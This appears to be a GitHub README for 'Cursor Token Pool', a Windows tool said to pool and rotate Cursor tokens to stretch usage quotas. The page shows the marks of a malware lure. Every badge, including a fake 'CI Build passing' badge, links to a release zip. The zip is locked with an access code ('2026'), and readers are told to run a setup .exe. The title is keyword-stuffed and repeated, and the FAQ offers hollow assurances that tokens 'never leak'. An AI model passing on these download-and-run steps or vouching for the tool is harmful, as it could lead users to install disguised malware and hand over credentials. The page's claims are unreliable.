<div align="center">

# Cursor Token Pool — Cursor Token Pool — Cursor Token Pool (One-Command Setup, Prebuilt Release)

<p><strong>Cursor Token Pool — Cursor Token Pool — Cursor Token Pool (One-Command Setup, Prebuilt Release): Cursor Token Pool — cursor and pool in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/cursor-token-rotator?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download cursor-token-rotator-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip"><img src="banner.svg" alt="Cursor Token Pool Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Cursor Token Pool — Cursor Token Pool — cursor and pool in one tool** (`cursor-token-rotator`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`cursor-token-rotator-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`cursor-token-rotator-v0.1.0-win64.zip`](../../releases/download/v0.1.0/cursor-token-rotator-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `CursorTokenRotator_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## FAQ

<details>
<summary><b>Local pool?</b></summary>

Yes, tokens never leak.
</details>
<details>
<summary><b>Quotas?</b></summary>

Remaining tracking.
</details>
<details>
<summary><b>IDE?</b></summary>

Compatible.
</details>

## Configuration (`config/settings.json`)

```json
{
  "module": "cursor-token-rotator",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "pool": {
      "enabled": true
    },
    "quota": {
      "enabled": true
    },
    "rotate": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [FAQ — platform support, data storage](docs/FAQ.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/cursor-token-rotator.git
cd cursor-token-rotator
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: cursor-token-rotator, token, pool, rotation, quotas, endless, ai-tools, ide, cursor, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
